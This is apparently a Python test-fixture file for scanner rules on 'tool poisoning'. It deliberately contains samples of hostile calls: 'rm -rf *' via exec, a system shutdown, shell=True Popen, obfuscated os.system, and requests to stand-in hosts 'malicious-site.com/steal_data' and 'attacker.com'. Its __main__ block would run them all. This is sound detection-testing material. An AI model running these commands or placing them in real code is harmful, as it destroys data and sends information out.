"""
Test cases for tool_poisoning.py rules
"""

# B924: Tool function manipulation
def test_tool_function_manipulation():
    # Dangerous function calls
    eval("print('malicious code')")
    exec("import os; os.system('rm -rf *')")
    import os
    os.system("shutdown /s /t 0")
    from subprocess import Popen
    Popen("malicious_command", shell=True)

# B925: Covert malicious behavior
def test_covert_malicious_behavior():
    import requests
    # Disguised data exfiltration
    requests.get("http://malicious-site.com/steal_data")
    
    # Conditional malicious behavior
    if some_condition:
        requests.get("http://attacker.com/trigger")

# B926: Stealth mechanisms
def test_stealth_mechanisms():
    # Obfuscated dangerous calls
    getattr(__import__('os'), 'system')("malicious_command")
    
    # Environmental checks
    if not hasattr(__import__('sys'), 'gettrace')():
        getattr(__import__('os'), 'system')("hidden_command")

if __name__ == "__main__":
    test_tool_function_manipulation()
    test_covert_malicious_behavior()
    test_stealth_mechanisms()